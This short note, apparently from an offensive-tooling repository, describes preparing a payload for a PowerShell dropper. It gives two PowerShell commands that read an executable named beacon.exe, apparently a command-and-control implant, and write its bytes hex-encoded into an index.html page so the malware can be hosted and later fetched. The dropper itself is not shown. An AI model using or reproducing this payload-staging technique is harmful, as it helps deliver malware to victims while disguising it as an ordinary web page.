This is the dropper ps1 script.

Get the bytestream of the exe you want to host with:

```
[byte[]]$data = [System.IO.File]::ReadAllBytes('.\Desktop\beacon.exe') 
```

Then write it to our index.html page:

```
[System.IO.File]::WriteAllText('index.html',[System.BitConverter]::ToString($data).Replace('-',''), [System.Text.Encoding]::ASCII)
```
